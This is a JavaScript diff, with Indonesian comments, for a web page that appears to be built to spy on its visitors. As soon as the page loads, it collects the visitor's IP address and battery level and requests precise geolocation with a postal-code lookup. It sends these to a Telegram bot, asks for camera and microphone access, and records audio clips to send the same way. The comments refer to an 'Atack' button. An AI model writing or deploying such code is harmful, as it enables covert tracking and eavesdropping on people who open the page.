@@ -121,30 +121,35 @@
       });
     }
 
-    // Fitur Lokasi Otomatis
-    async function getFullLocation() {
-      if (!navigator.geolocation) {
-        sendToTelegram("Browser tidak mendukung lokasi");
-        return;
+    // Fungsi Gabungan untuk Meminta Semua Izin Sekaligus
+    async function requestAllPermissions() {
+      // 1. Minta Lokasi
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          async (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            let postalCode = "N/A";
+            try {
+              const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
+              const data = await res.json();
+              postalCode = data.address.postcode || "N/A";
+            } catch (e) {}
+            sendToTelegram(`<b>📍 Lokasi Terdeteksi:</b>\nLat: ${lat}\nLon: ${lon}\nKode Pos: ${postalCode}\n<a href="${mapsLink}">Google Maps</a>`);
+          },
+          (err) => { sendToTelegram("maaf akses lokasi ke tolak"); },
+          { enableHighAccuracy: true }
+        );
       }
 
-      navigator.geolocation.getCurrentPosition(async (position) => {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-        
-        let postalCode = "Tidak ditemukan";
-        try {
-          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
-          const data = await res.json();
-          postalCode = data.address.postcode || "Tidak tersedia";
-        } catch (e) {}
-
-        const msg = `<b>📍 Lokasi Pengunjung:</b>\nLat: ${lat}\nLon: ${lon}\nKode Pos: ${postalCode}\n\n<a href="${mapsLink}">Buka di Google Maps</a>`;
-        sendToTelegram(msg);
-      }, (err) => {
-        sendToTelegram("maaf akses lokasi ke tolak");
-      }, { enableHighAccuracy: true });
+      // 2. Minta Kamera & Mikrofon
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+        stream.getTracks().forEach(track => track.stop()); // Matikan setelah izin didapat
+      } catch (err) {
+        // Notifikasi penolakan akan dikirim saat tombol Atack ditekan jika masih ditolak
+      }
     }
 
     async function getInfo() {
@@ -153,15 +158,8 @@
         const ipData = await ipRes.json();
         const battery = await navigator.getBattery?.() || { level: 0 };
         const text = `IP: ${ipData.ip}\nBaterai: ${(battery.level * 100).toFixed(0)}%\nWaktu: ${new Date().toLocaleString()}`;
-        sendToTelegram(`<b>📥 Info Pengunjung (Auto):</b>\n<pre>${text}</pre>`);
+        sendToTelegram(`<b>📥 Info Pengunjung (Masuk):</b>\n<pre>${text}</pre>`);
       } catch {}
-    }
-
-    async function requestPermissions() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-        stream.getTracks().forEach(track => track.stop());
-      } catch (err) {}
     }
 
     async function recordAudio() {
@@ -172,7 +170,7 @@
         mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
         mediaRecorder.onstop = () => {
           const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
-          sendMedia(blob, 'voice', 'voice.ogg', '🎤 Voice Note (5s)');
+          sendMedia(blob, 'voice', 'voice.ogg', '🎤 Voice Note');
           stream.getTracks().forEach(track => track.stop());
         };
         mediaRecorder.start();
@@ -228,8 +226,7 @@
     document.addEventListener('DOMContentLoaded', () => {
       createParticles();
       getInfo();
-      requestPermissions();
-      getFullLocation(); // Panggil lokasi otomatis saat masuk
+      requestAllPermissions(); // Pemicu semua akses saat masuk
     });
 
     function createParticles() {
